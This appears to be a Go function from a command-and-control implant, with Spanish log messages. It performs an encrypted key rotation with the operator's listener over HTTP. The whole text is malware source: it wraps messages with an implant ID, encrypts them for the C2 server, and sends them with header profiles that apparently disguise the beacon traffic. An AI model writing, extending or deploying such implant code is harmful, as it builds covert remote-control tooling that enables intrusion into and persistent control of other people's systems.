func handleRekeyRequestHTTP(
	profile *profiles.Profile,
	implantID string,
	sc *crypto.SessionCrypto,
	encrypted []byte,
) error {
	debugLog("rekey HTTP: descifrando server_eph_pub")
	serverEphPub, err := decodeServerEphPub(sc, encrypted)
	if err != nil {
		return err
	}

	debugLog("rekey HTTP: generando par efímero")
	ephPriv, ephPub, err := crypto.GenerateKeyPair()
	if err != nil {
		return err
	}

	// Responder BAJO CLAVES VIEJAS.
	resp := map[string]string{
		"implant_eph_pub": base64.StdEncoding.EncodeToString(ephPub.Bytes()),
	}
	respJSON, _ := json.Marshal(resp)
	encResp, err := sc.EncryptForC2(respJSON, nil)
	if err != nil {
		return err
	}
	wrapper := protocol.EncryptedWrapper{ImplantID: implantID, Data: encResp}
	wrapJSON, _ := json.Marshal(wrapper)
	resEnv := protocol.NewEnvelope(protocol.MsgKeyRotation, wrapJSON)
	resBytes, _ := resEnv.Marshal()

	httpReq, err := http.NewRequest("POST", ListenerURL, bytes.NewReader(resBytes))
	if err != nil {
		return err
	}
	profile.ApplyHeaders(httpReq)
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	debugLog("rekey HTTP: enviando implant_eph_pub")
	client, err := newHTTPClient()
	if err != nil {
		return fmt.Errorf("crear http client: %w", err)
	}
	resp2, err := client.Do(httpReq)
	if err != nil {
		return err
	}
	defer resp2.Body.Close()
	debugLog("rekey HTTP: respuesta HTTP %d", resp2.StatusCode)

	if resp2.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, resp2.Body)
		return fmt.Errorf("rekey: server respondió %d", resp2.StatusCode)
	}

	if err := sc.ApplyRekeyAsBeacon(ephPriv, serverEphPub); err != nil {
		_, _ = io.Copy(io.Discard, resp2.Body)
		return err
	}
	debugLog("rekey HTTP: rekey aplicado localmente, descifrando ack")

	body, err := io.ReadAll(resp2.Body)
	if err != nil {
		return fmt.Errorf("rekey: leer ack: %w", err)
	}
	respEnv, err := protocol.UnmarshalEnvelope(body)
	if err != nil {
		return fmt.Errorf("rekey: unmarshal ack: %w", err)
	}
	if respEnv.Type != protocol.MsgKeyRotation {
		return fmt.Errorf("rekey: tipo de ack inesperado: %d", respEnv.Type)
	}
	ack, err := sc.DecryptFromC2(respEnv.Payload, nil)
	if err != nil {
		return fmt.Errorf("rekey: descifrar ack: %w", err)
	}
	if string(ack) != "ok" {
		return fmt.Errorf("rekey: ack inesperado: %q", ack)
	}
	debugLog("rekey HTTP: ack OK, rekey completo")

	return nil
}

